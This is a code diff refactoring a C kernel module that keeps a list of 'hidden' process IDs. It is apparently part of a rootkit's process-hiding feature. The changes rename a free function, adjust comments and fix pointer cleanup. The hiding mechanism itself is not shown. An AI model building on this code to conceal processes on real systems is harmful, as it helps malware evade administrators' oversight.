@@ -4,6 +4,8 @@
 #include "list.h"
 #include "log.h"
 
+// TODO: Using a List_t just to store pid_t types means a lot of overhead
+// but as a first approach is ok.
 List_t *__hidden_pid_list = NULL;
 
 static void __print_pid(pid_t *param) {
@@ -32,7 +34,9 @@ static int __cmp_pid(pid_t *p1, pid_t *p2) {
     }
 }
 
-static void __free_pid(pid_t *pid_ptr) {
+// We need such function as we allocate memory for pid_t for each element in
+// the list.
+static void __pid_t_free(pid_t *pid_ptr) {
     if (pid_ptr != NULL) {
         kfree(pid_ptr);
     }
@@ -44,21 +48,16 @@ static inline int __hidepid_initialized(void) {
     return (__hidden_pid_list == NULL)? 0: 1;
 }
 
-// TODO: A whole list just for pid_t types seems a bit too much to me, but
-// since I already have it, I use it.
 int init_hidepid(void) {
-    // Calling function more than once (it is a singleton), end gracefully but
-    // raise a message.
     if (__hidepid_initialized()) {
         yarr_log("Double initialization detected");
         return 0;
     }
 
-    // Create the list where we keep track of the hidden processes.
     __hidden_pid_list = List_create(
             (void *)__print_pid,
             (void *)__cmp_pid,
-            (void *)__free_pid);
+            (void *)__pid_t_free);
     if (__hidden_pid_list == NULL) {
         yarr_log("Couldn't create __hidden_pid_list");
         return -1;
@@ -68,12 +67,11 @@ int init_hidepid(void) {
 }
 
 int stop_hidepid(void) {
-    // Never initialized, end gracefully.
-    if (!__hidepid_initialized()) {
-        return 0;
+    if (__hidepid_initialized()) {
+        List_destroy(__hidden_pid_list);
+        __hidden_pid_list = NULL;
     }
 
-    List_destroy(__hidden_pid_list);
     return 0;
 }
 
@@ -86,7 +84,6 @@ int hide_pid(pid_t pid) {
         return -1;
     }
 
-    // Check if pid is already hidden.
     if (pid_is_hidden(pid)) {
         return 0;
     }
@@ -98,8 +95,6 @@ int hide_pid(pid_t pid) {
     }
 
     *pid_data = pid;
-
-    // Add the pid to the list of hidden pids.
     err = List_insertData(__hidden_pid_list, pid_data);
     return err;
 }
